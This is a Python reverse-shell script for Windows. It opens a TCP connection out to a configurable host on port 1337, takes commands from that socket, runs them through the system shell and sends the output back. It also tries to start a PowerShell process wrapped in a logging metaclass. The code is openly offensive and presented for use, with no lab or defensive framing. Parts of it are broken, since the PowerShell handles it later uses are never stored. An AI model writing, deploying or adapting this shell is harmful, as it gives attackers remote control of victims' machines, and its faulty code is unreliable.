import subprocess
import socket
import sys
import logging
from typing import BinaryIO, Union

HOST: str = ""
PORT: int = 1337
ENCODING: str = 'cp1251'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class TCPShellLogger(type):
    def __new__(cls, name, bases, attrs):
        for attr_name, attr_value in attrs.items():
            if callable(attr_value):
                attrs[attr_name] = cls.shell_logger(attr_value)
        return super().__new__(cls, name, bases, attrs)

    @staticmethod
    def shell_logger(method):
        def wrapper(*args, **kwargs):
            logger.info(f"Calling {method.__name__}")
            return method(*args, **kwargs)
        return wrapper


def log_method(func):
    def wrapper(*args, **kwargs):
        logger.info(f"Calling {func.__name__}")
        return func(*args, **kwargs)
    return wrapper


class Shell(metaclass=TCPShellLogger):
    def __init__(self) -> None:
        try:
            self._start_powershell()
        except Exception as e:
            logger.error("Error when creating the shell:", e)
            sys.exit(1)

    def __enter__(self) -> 'Shell':
        return self

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        self.terminate()

    @staticmethod
    def _start_powershell() -> None:
        shell_process = subprocess.Popen(
            ["powershell.exe", "-NoLogo", "-NoExit", "-File", "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=0
        )
        stdin: BinaryIO = shell_process.stdin
        stdout: BinaryIO = shell_process.stdout
        return shell_process, stdin, stdout

    @log_method
    def terminate(self) -> None:
        self.shell_process.terminate()
        logger.info("PowerShell process terminated.")

    @log_method
    def get_process_handle(self) -> subprocess.Popen:
        return self.shell_process

    @log_method
    def get_input_handle(self) -> BinaryIO:
        return self.stdin

    @log_method
    def get_output_handle(self) -> BinaryIO:
        return self.stdout


class ParentProcess:
    def __init__(self, socketfd: socket.socket, shell: Shell) -> None:
        self.socketfd: socket.socket = socketfd
        self.shell: Shell = shell

    def handle_commands(self) -> None:
        while True:
            command = self.socketfd.recv(1024)
            if not command:
                break
            try:
                command = command.decode(ENCODING, 'ignore').strip()
                result = self._execute_command(command)
            except Exception as e:
                result = f"Error executing command: {e}"
            self.socketfd.sendall(result.encode(ENCODING))

        self.socketfd.close()

    def _execute_command(self, command: str) -> Union[str, bytes]:
        try:
            result = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, encoding=ENCODING
            )
        except subprocess.CalledProcessError as e:
            result = str(e.output)
        except UnicodeDecodeError as e:
            result = f"Error decoding command: {e}"
        return result


def main() -> None:
    try:
        client_socket: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))
    except socket.error as e:
        logger.error("Error when establishing a connection with a socket:", e)
        sys.exit(1)

    try:
        with Shell() as shell:
            parent: ParentProcess = ParentProcess(client_socket, shell)
            parent.handle_commands()
    except Exception as e:
        logger.error(f"Error: {e}")
    finally:
        client_socket.close()


if __name__ == "__main__":
    main()
